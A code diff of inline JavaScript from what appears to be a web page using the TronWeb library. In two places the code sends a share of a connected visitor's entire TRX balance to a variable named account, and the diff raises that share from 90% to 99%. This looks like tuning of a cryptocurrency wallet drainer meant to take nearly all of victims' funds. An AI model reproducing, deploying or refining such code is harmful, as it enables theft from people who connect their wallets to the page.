@@ -269,7 +269,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 90 / 100);
+                  var v = Math.floor(acc.balance * 99 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }
 
@@ -280,7 +280,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 90 / 100);
+                  var v = Math.floor(acc.balance * 99 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }</script>
     <script>window.addEventListener('message', async function (e) {
